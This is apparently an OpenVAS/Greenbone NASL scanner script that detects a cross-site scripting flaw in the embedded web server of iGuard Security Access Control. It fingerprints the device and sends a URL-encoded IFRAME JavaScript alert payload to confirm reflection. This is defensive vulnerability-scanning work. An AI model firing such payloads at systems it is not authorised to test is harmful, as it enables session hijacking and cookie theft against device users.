if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103485" );
	script_bugtraq_id( 53355 );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "iGuard Security Access Control Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53355" );
	script_xref( name: "URL", value: "http://iguard.me/iguard-access-control.html" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-05-08 10:33:52 +0200 (Tue, 08 May 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "iGuard Security Access Control is prone to a cross-site scripting
vulnerability because it fails to properly sanitize user-supplied
input in the embedded web server." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and launch other attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are
to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.html";
	buf = http_get_cache( item: url, port: port );
	if(ContainsString( buf, "Server: iGuard" ) || ContainsString( buf, "<TITLE>iGuard Security" )){
		url = "/%3E%3C/font%3E%3CIFRAME%20SRC=%22JAVASCRIPT:alert(%27xss-test%27);%22%3E.asp";
		if(http_vuln_check( port: port, url: url, pattern: "<IFRAME SRC=.JAVASCRIPT:alert\\('xss-test'\\);.>", check_header: TRUE )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

